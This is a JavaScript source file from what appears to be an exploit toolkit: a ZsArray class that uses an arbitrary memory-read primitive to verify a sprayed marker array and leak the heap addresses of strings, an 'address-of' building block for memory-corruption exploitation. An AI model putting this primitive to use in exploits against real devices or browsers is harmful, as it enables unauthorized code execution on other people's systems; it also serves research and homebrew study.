var zs = require('./index.js');

var Util = require('./Util.js');


var ident = "Obey the Moderator";
var arrayLength = 0x27; // Low % of 0x27 in memory


class ZsArray {
	
	constructor(memoryReader) {
		this.memoryReader = memoryReader;
		
		this.array = new Array(arrayLength);
		this.array[0] = ident + (new Date()).getTime();
	}
	
	
	///////////////////////////////////////
	// Public: Address discovery
	///////////////////////////////////////
	
	getAddress(value) {
		if (!this.verify()) {
			throw new Error("ZsArray is no longer valid!");
		}
		
		if (typeof value === "string") {
			this.array[1] = value;
			return this.getStringAddress();
		}
		
		throw new Error("getAddress currently only works on strings.");
	}
	
	getStringAddress() {
		var str = this.memoryReader.read(this.address + 0x20, 0x8);
		if (str.charCodeAt(0) !== 0xffff || str.charCodeAt(1) !== 0xfffe
			|| (str.charCodeAt(2) === 0 && str.charCodeAt(3) === 0)) {
			return null;
		}
		
		var addrCellPtr = Util.getint32(str.substr(2, 2));
		if (addrCellPtr < 0x80000000 || 0x8fffffff < addrCellPtr) {
			return null;
		}
		
		str = this.memoryReader.read(addrCellPtr + 0x8, 0x4);
		var addrValue = Util.getint32(str);
		if (addrValue < 0x80000000 || 0x8fffffff < addrValue) {
			return null;
		}
		
		str = this.memoryReader.read(addrValue, 0x40);
		var addrStr = null;
		var ptr1 = Util.getint32(str.substr(10, 2));
		if (ptr1 !== 0) {
			// TODO: Look at this case more in depth
			
			// Longer string
			// Could break, not 100% sure on this
			
			var addr2 = Util.getint32(str.substr(10, 2));
			if (addr2 < 0x80000000 || 0x8fffffff < addr2) {
				return null;
			}
			
			str = this.memoryReader.read(addr2 + 0x18, 0x4);
			var addr3 = Util.getint32(str);
			if (addr3 < 0x80000000 || 0x8fffffff < addr3) {
				return null;
			}
			
			// Try 0x0 first
			var mem = this.memoryReader.read(addr3, this.array[1].length * 2);
			if (mem === this.array[1]) {
				//zs.logger.debug(`Found long at zero: ${this.array[1].length}`);
				addrStr = addr3;
			}
			
			// Search around reasonable offset
			if (addrStr === null) {
				var reasonableOffset = this.getReasonableOffset(this.array[1].length) * 2 - 0x50;
				
				mem = this.memoryReader.read(addr3 + reasonableOffset, this.array[1].length * 2 + 0x100);
				for (var i = 0; i < 0x100 / 2; i++) {
					str = mem.substr(i, this.array[1].length);
					if (str === this.array[1]) {
						//zs.logger.debug(`Found long a: ${this.array[1].length}    ${i}`);
						addrStr = addr3 + reasonableOffset + i * 2;
						//zs.logger.debug(`addrStr: ${addrStr.toString(16)}`);
						break;
					}
				}
			}
			
			// Search 0x20000 bytes (last resort)
			if (addrStr === null) {
				mem = this.memoryReader.read(addr3, this.array[1].length * 2 + 0x20000);
				for (var i = 0; i < 0x20000 / 2; i++) {
					str = mem.substr(i, this.array[1].length);
					if (str === this.array[1]) {
						zs.logger.debug(`Found long b: ${this.array[1].length}    ${i}`);
						addrStr = addr3 + i * 2;
						zs.logger.debug(`addrStr: ${addrStr.toString(16)}`);
						break;
					}
				}
			}			
		} else {
			// Shorter string
			addrStr = Util.getint32(str.substr(12, 2));
			
			if (addrStr < 0x80000000 || 0x8fffffff < addrStr) {
				return null;
			}
			
			str = this.memoryReader.read(addrStr, this.array[1].length * 2);
			if (str !== this.array[1]) {
				return null;
			}
		}
		
		return addrStr;
	}
	
	getReasonableOffset(strLength) {
		return ~~(0.12610622308133998 * strLength + 10.885473027119275);
	}
	
	
	///////////////////////////////////////
	// Public: Array getting, address setting
	///////////////////////////////////////
	
	getArray() {
		return this.array;
	}
	
	setAddress(address) {
		this.address = address;
	}
	
	
	///////////////////////////////////////
	// Private: Verification
	///////////////////////////////////////
	
	verify() {
		var str = this.memoryReader.read(this.address, 0xc);
		if (str.charCodeAt(1) !== this.array.length || str.charCodeAt(3) !== this.array.length
			|| str.charCodeAt(5) > this.array.length || str.charCodeAt(0) !== 0
			|| str.charCodeAt(2) !== 0 || str.charCodeAt(4) !== 0) {
			return false;
		}
		
		str = this.memoryReader.read(this.address + 0x18, 0x8);
		if (str.charCodeAt(0) !== 0xffff || str.charCodeAt(1) !== 0xfffe
			|| str.charCodeAt(2) === 0 || str.charCodeAt(3) === 0) {
			return false;
		}
		
		var addrStrObjPtr = Util.getint32(str.substr(2, 2));
		if (addrStrObjPtr < 0x80000000 || 0x8fffffff < addrStrObjPtr) {
			return false;
		}
		
		str = this.memoryReader.read(addrStrObjPtr + 0x8, 4);
		var addrStrObj = Util.getint32(str);
		if (addrStrObj < 0x80000000 || 0x8fffffff < addrStrObj) {
			return false;
		}
		
		str = this.memoryReader.read(addrStrObj + 0x18, 4);
		var addrStr = Util.getint32(str);
		if (addrStr < 0x80000000 || 0x8fffffff < addrStr) {
			return false;
		}
		
		str = this.memoryReader.read(addrStr, this.array[0].length * 2);
		if (str !== this.array[0]) {
			return false;
		}
		
		return true;
	}
	
}

module.exports = ZsArray;